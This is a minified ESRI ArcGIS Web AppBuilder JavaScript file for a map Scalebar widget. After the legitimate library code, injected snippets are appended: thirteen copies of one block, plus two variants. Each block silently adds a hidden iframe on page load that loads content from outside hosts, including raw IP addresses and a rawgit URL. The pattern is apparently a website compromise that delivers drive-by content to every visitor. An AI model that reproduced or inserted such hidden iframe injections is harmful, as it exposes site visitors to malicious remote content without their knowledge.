// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/Scalebar":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/connect dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/dom-style dojo/has dojo/query ../kernel ../lang ../domUtils ../units ../SpatialReference ../WKIDUnitConversion ../geometry/Point ../geometry/ScreenPoint ../geometry/Polyline ../geometry/geodesicUtils ../geometry/webMercatorUtils ../geometry/screenUtils ../geometry/normalizeUtils dojo/i18n!../nls/jsapi".split(" "),function(m,
k,n,b,q,p,v,r,w,g,x,z,h,A,B,t,C,D,E,y,u,F,G,H){m=m(null,{declaredClass:"esri.dijit.Scalebar",map:null,mapUnit:null,scalebarUnit:null,unitsDictionary:[],domNode:null,screenPt1:null,screenPt2:null,localStrings:H.widgets.scalebar,constructor:function(a,c){this.metricScalebar=p.create("div",{innerHTML:"\x3cdiv class\x3d'esriScaleLabelDiv'\x3e\x3cdiv class\x3d'esriScalebarLabel esriScalebarLineLabel esriScalebarSecondNumber'\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarLine esriScalebarMetricLine'\x3e\x3c/div\x3e"});
this.englishScalebar=p.create("div",{innerHTML:"\x3cdiv class\x3d'esriScalebarLine esriScalebarEnglishLine'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScaleLabelDiv'\x3e\x3cdiv class\x3d'esriScalebarLabel esriScalebarLineLabel esriScalebarSecondNumber'\x3e\x3c/div\x3e\x3c/div\x3e"});this.domNode=p.create("div");a=a||{};if(a.map){if(a.scalebarUnit){if("english"!==a.scalebarUnit&&"metric"!==a.scalebarUnit&&"dual"!==a.scalebarUnit){console.error("scalebar unit only accepts english or metric or dual");return}this.scalebarUnit=
a.scalebarUnit}else this.scalebarUnit="english";if(a.scalebarStyle){if("ruler"!==a.scalebarStyle&&"line"!==a.scalebarStyle){console.error("scalebar style must be ruler or line");return}this.scalebarStyle=a.scalebarStyle}else this.scalebarStyle="ruler";this.background=a.background;switch(this.scalebarUnit){case "english":"ruler"===this.scalebarStyle&&(this.englishScalebar.innerHTML="\x3cdiv class\x3d'esriScalebarRuler'\x3e\x3cdiv class\x3d'esriScalebarRulerBlock upper_firstpiece'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarRulerBlock upper_secondpiece'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarRulerBlock lower_firstpiece'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarRulerBlock lower_secondpiece'\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d'scaleLabelDiv'\x3e\x3cdiv class\x3d'esriScalebarLabel' style\x3d'left: -3%'\x3e0\x3c/div\x3e\x3cdiv class\x3d'esriScalebarLabel esriScalebarFirstNumber'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarLabel esriScalebarSecondNumber'\x3e\x3c/div\x3e\x3c/div\x3e");
this.domNode.appendChild(this.englishScalebar);break;case "metric":"ruler"===this.scalebarStyle&&(this.metricScalebar.innerHTML="\x3cdiv class\x3d'esriScalebarRuler'\x3e\x3cdiv class\x3d'esriScalebarRulerBlock upper_firstpiece'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarRulerBlock upper_secondpiece'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarRulerBlock lower_firstpiece'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarRulerBlock lower_secondpiece'\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d'scaleLabelDiv'\x3e\x3cdiv class\x3d'esriScalebarLabel' style\x3d'left: -3%'\x3e0\x3c/div\x3e\x3cdiv class\x3d'esriScalebarLabel esriScalebarFirstNumber'\x3e\x3c/div\x3e\x3cdiv class\x3d'esriScalebarLabel esriScalebarSecondNumber'\x3e\x3c/div\x3e\x3c/div\x3e");
this.domNode.appendChild(this.metricScalebar);break;case "dual":this.domNode.appendChild(this.metricScalebar),this.domNode.appendChild(this.englishScalebar)}this.map=a.map;c?c.appendChild(this.domNode):(this.map.container.appendChild(this.domNode),a.attachTo?q.add(this.domNode,"scalebar_"+a.attachTo):q.add(this.domNode,"scalebar_bottom-left"));q.add(this.domNode,"esriScalebar");if(this.map.loaded)this._getDistance(this.map.extent),this._checkBingMaps();else var l=b.connect(this.map,"onLoad",this,
function(){b.disconnect(l);l=null;this._getDistance(this.map.extent);this._checkBingMaps()});this._mapOnPan=b.connect(this.map,"onPan",this,this._getDistance);this._mapOnExtentChange=b.connect(this.map,"onExtentChange",this,this._getDistance);n.forEach(this.map.layerIds,function(a,c){"esri.virtualearth.VETiledLayer"===this.map.getLayer(a).declaredClass&&b.connect(this.map.getLayer(a),"onVisibilityChange",k.hitch(this,function(a){this._checkBingMaps()}))},this);this._mapOnLayerAdd=b.connect(this.map,
"onLayerAdd",k.hitch(this,function(a){"esri.virtualearth.VETiledLayer"===a.declaredClass&&b.connect(a,"onVisibilityChange",k.hitch(this,function(a){this._checkBingMaps()}));this._checkBingMaps()}));this._mapOnLayerRemove=b.connect(this.map,"onLayerRemove",k.hitch(this,this._checkBingMaps))}else console.error("scalebar: unable to find the 'map' property in parameters")},hide:function(){this._hidden=!0;h.hide(this.domNode)},show:function(){this._hidden=!1;h.show(this.domNode)},destroy:function(){b.disconnect(this._mapOnPan);
b.disconnect(this._mapOnExtentChange);b.disconnect(this._mapOnLayerAdd);b.disconnect(this._mapOnLayerRemove);this.hide();this.map=null;p.destroy(this.domNode)},_checkBingMaps:function(){q.contains(this.domNode,"scalebar_bottom-left")&&(r.set(this.domNode,"left","25px"),n.forEach(this.map.layerIds,function(a,c){"esri.virtualearth.VETiledLayer"===this.map.getLayer(a).declaredClass&&this.map.getLayer(a).visible&&(a="95px",this.map._mapParams.nav&&(a="115px"),r.set(this.domNode,"left",a))},this))},_getDistance:function(a){var c=
v.position(this.domNode,!0).y-this.map.position.y,c=c>this.map.height?this.map.height:c,c=0>c?0:c,l=new D(0,c),c=new D(this.map.width,c),d,f;this.mapUnit="esriDecimalDegrees";var e=F.toMapPoint(a,this.map.width,this.map.height,l),b=F.toMapPoint(a,this.map.width,this.map.height,c),l=new C(a.xmin,(a.ymin+a.ymax)/2,this.map.spatialReference),c=new C(a.xmax,(a.ymin+a.ymax)/2,this.map.spatialReference);if(3857===this.map.spatialReference.wkid||102100===this.map.spatialReference.wkid||102113===this.map.spatialReference.wkid||
this.map.spatialReference.wkt&&-1!=this.map.spatialReference.wkt.indexOf("WGS_1984_Web_Mercator"))e=u.webMercatorToGeographic(e,!0),b=u.webMercatorToGeographic(b,!0),l=u.webMercatorToGeographic(l,!0),c=u.webMercatorToGeographic(c,!0);else if(z.isDefined(t[this.map.spatialReference.wkid])||this.map.spatialReference.wkt&&0===this.map.spatialReference.wkt.indexOf("PROJCS")){this.mapUnit="linearUnit";a=Math.abs(a.xmax-a.xmin);if(z.isDefined(t[this.map.spatialReference.wkid]))d=t.values[t[this.map.spatialReference.wkid]];
else{d=this.map.spatialReference.wkt;f=d.lastIndexOf(",")+1;var h=d.lastIndexOf("]]");d=parseFloat(d.substring(f,h))}a*=d;f=a/1609;d=a/1E3;a/=1E3}"esriDecimalDegrees"===this.mapUnit&&(d=y.isSupported(this.map.spatialReference)?this.map.spatialReference.wkid:4326,a=new E(new B({wkid:d})),a.addPath([e,b]),e=G._straightLineDensify(a,10),a=y.geodesicLengths([e],A.KILOMETERS)[0],e=new E(new B({wkid:d})),e.addPath([l,c]),l=G._straightLineDensify(e,10),y.geodesicLengths([l],A.KILOMETERS),f=a/1.609,d=a);
"english"===this.scalebarUnit?this._getScaleBarLength(f,"mi"):"metric"===this.scalebarUnit?this._getScaleBarLength(d,"km"):"dual"===this.scalebarUnit&&(this._getScaleBarLength(f,"mi"),this._getScaleBarLength(d,"km"))},_getScaleBarLength:function(a,c){a=50*a/this.map.width;var b=0,d=c;.1>a&&("mi"===c?(a*=5280,d="ft"):"km"===c&&(a*=1E3,d="m"));for(;1<=a;)a/=10,b++;var f,e;.5<a?(f=1,e=.5):.3<a?(f=.5,e=.3):.2<a?(f=.3,e=.2):.15<a?(f=.2,e=.15):.1<=a&&(f=.15,e=.1);c=f/a>=a/e?e:f;this._drawScaleBar(c/a*50,
Math.pow(10,b)*c,d)},_drawScaleBar:function(a,c,b){var d=2*Math.round(a),f,e;"mi"===b||"ft"===b?(this.englishScalebar.style.width=d+"px",a=g(".esriScalebarFirstNumber",this.englishScalebar),f=g(".esriScalebarSecondNumber",this.englishScalebar),e=g(".esriScalebarMetricLineBackground",this.englishScalebar)):(this.metricScalebar.style.width=d+"px",a=g(".esriScalebarFirstNumber",this.metricScalebar),f=g(".esriScalebarSecondNumber",this.metricScalebar),e=g(".esriScalebarMetricLineBackground",this.metricScalebar));
n.forEach(e,function(a,c){a.style.width=d-2+"px"},this);n.forEach(a,function(a,b){a.innerHTML=c},this);n.forEach(f,function(a,d){a.innerHTML="esriUnknown"!==this.mapUnit?2*c+this.localStrings[b]:2*c+"Unknown Unit"},this)}});w("extend-esri")&&k.setObject("dijit.Scalebar",m,x);return m})},"widgets/Scalebar/_build-generate_module":function(){define(["dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Scalebar/css/style.css":".jimu-rtl .jimu-widget-scalebar .scaleLabelDiv .esriScalebarLabel:first-child{right: -3% !important; left: auto !important;};.jimu-rtl .jimu-widget-scalebar .scaleLabelDiv .esriScalebarFirstNumber{right: 45% !important; left: auto;}.jimu-rtl .jimu-widget-scalebar .scaleLabelDiv .esriScalebarSecondNumber{right: 95%; left: auto;}.jimu-widget-scalebar .ruler-style {position: relative; top: -5px !important; left: 0 !important;}",
"*now":function(m){m(['dojo/i18n!*preload*widgets/Scalebar/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/Deferred jimu/BaseWidget jimu/utils jimu/portalUtils jimu/dijit/Message esri/dijit/Scalebar dojo/dom-style dojo/query dojo/NodeList-dom".split(" "),function(m,k,n,b,q,p,v,r,w,g,x){return m([q],{baseClass:"jimu-widget-scalebar",name:"Scalebar",scalebar:null,moveTopOnActive:!1,startup:function(){this.inherited(arguments);var b=this.config.scalebar;b.map=this.map;this.position&&(void 0!==this.position.top&&void 0!==this.position.left?b.attachTo=
"top-left":void 0!==this.position.top&&void 0!==this.position.right?b.attachTo="top-right":void 0!==this.position.bottom&&void 0!==this.position.left?b.attachTo="bottom-left":void 0!==this.position.bottom&&void 0!==this.position.right&&(b.attachTo="bottom-right"));this._processConfig(b).then(k.hitch(this,function(b){b.scalebarStyle||(b.scalebarStyle="line");this.scalebar=new w(b);this.scalebar.show();this.domNode.appendChild(this.scalebar.domNode);this._hackForhighlight();"ruler"===b.scalebarStyle?
n.addClass(this.scalebar.domNode,"ruler-style"):n.removeClass(this.scalebar.domNode,"ruler-style");var h={left:"auto",right:"auto",top:"auto",bottom:"auto",width:"auto"};k.mixin(h,this.position);g.set(this.domNode,p.getPositionStyle(h));setTimeout(k.hitch(this,function(){this.domNode&&g.set(this.domNode,p.getPositionStyle(h))}),1E3)}),k.hitch(this,function(b){new r({message:b.message||b})}))},_processConfig:function(g){var h=new b;g.scalebarUnit?h.resolve(g):v.getUnits(this.appConfig.portalUrl).then(k.hitch(this,
function(b){g.scalebarUnit="english"===b?"english":"metric";h.resolve(g)}));return h.promise},_hackForhighlight:function(){x(".esriScalebar",this.domNode).removeClass("esriScalebar")},onClose:function(){this.scalebar.destroy()}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});